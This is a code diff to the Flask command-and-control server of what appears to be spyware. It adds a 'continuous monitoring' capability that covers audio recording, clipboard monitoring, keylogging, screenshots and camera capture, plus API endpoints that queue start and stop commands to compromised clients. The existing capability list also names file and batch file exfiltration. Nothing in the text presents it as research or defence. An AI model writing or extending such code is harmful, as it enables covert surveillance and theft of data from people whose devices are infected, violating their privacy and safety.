@@ -66,6 +66,8 @@ CAPABILITIES = {
     8: "File Exfiltrator (exfiltrate_file)",
     9: "Batch File Exfiltrator (exfiltrate_user_files_by_extension)",
     10: "Camera Capture (start_camera_capture)",
+    11: "Start Continuous Monitoring (audio_record, clipboard_monitor, keylogger, screenshot, camera_capture)",
+    12: "Stop Continuous Monitoring",
 }
 
 
@@ -350,6 +352,102 @@ def send_command():
         
     except Exception as e:
         logger.error(f"Error sending command: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/continuous_monitoring/start', methods=['POST'])
+def start_continuous_monitoring():
+    """
+    Enable continuous monitoring for a client
+    URL: POST /api/continuous_monitoring/start
+    Body: {"client_id": "<client_id>"}
+    """
+    try:
+        data = request.get_json()
+        
+        if not data:
+            return jsonify({"status": "error", "message": "No JSON data"}), 400
+        
+        client_id = data.get('client_id')
+        
+        if not client_id:
+            return jsonify({"status": "error", "message": "client_id required"}), 400
+        
+        client = Client.query.get(client_id)
+        if not client:
+            return jsonify({"status": "error", "message": "Client not found"}), 404
+        
+        # Set continuous monitoring flag
+        client.continuous_monitoring_enabled = True
+        
+        # Create the start command
+        cmd = Command(
+            client_id=client_id,
+            capability=11,  # Start continuous monitoring
+            args=''
+        )
+        db.session.add(cmd)
+        db.session.commit()
+        
+        logger.info(f"[+] Continuous monitoring started for {client_id}")
+        
+        return jsonify({
+            "status": "success",
+            "message": "Continuous monitoring started",
+            "client_id": client_id
+        }), 200
+        
+    except Exception as e:
+        logger.error(f"Error starting continuous monitoring: {str(e)}")
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/continuous_monitoring/stop', methods=['POST'])
+def stop_continuous_monitoring():
+    """
+    Disable continuous monitoring for a client
+    URL: POST /api/continuous_monitoring/stop
+    Body: {"client_id": "<client_id>"}
+    """
+    try:
+        data = request.get_json()
+        
+        if not data:
+            return jsonify({"status": "error", "message": "No JSON data"}), 400
+        
+        client_id = data.get('client_id')
+        
+        if not client_id:
+            return jsonify({"status": "error", "message": "client_id required"}), 400
+        
+        client = Client.query.get(client_id)
+        if not client:
+            return jsonify({"status": "error", "message": "Client not found"}), 404
+        
+        # Unset continuous monitoring flag
+        client.continuous_monitoring_enabled = False
+        
+        # Create the stop command
+        cmd = Command(
+            client_id=client_id,
+            capability=12,  # Stop continuous monitoring
+            args=''
+        )
+        db.session.add(cmd)
+        db.session.commit()
+        
+        logger.info(f"[+] Continuous monitoring stopped for {client_id}")
+        
+        return jsonify({
+            "status": "success",
+            "message": "Continuous monitoring stopped",
+            "client_id": client_id
+        }), 200
+        
+    except Exception as e:
+        logger.error(f"Error stopping continuous monitoring: {str(e)}")
         db.session.rollback()
         return jsonify({"status": "error", "message": str(e)}), 500
 
